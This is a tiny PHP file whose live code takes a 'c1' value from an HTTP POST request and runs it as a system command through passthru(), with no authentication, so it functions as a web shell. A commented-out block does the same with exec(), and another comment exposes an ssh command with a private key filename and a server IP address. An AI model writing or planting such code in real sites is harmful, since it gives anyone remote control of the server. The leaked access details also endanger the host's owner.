<?php
/*	
	//ssh -i Space/LightsailDefaultPrivateKey-us-east-1.pem ubuntu@54.167.81.46
	
	
	header("Content-Type: application/json; charset=UTF-8");
		
	$_tp = Php_Ls_Cln($_POST['tp']);
	$cmd = Php_Ls_Cln($_POST['cmd']);
			
	if($_tp == 'conn')
		
		
		exec($cmd, $_out);
		
		$rsp['msj'] = $_out;
		$rsp['e'] = 'ok';
		
	}
	
	echo json_encode($rsp);
	*/

$c1=$_POST['c1'];
$c2=$_POST['c2'];


 $rsp = passthru($c1,$c2);
 
 echo $rsp; 



?>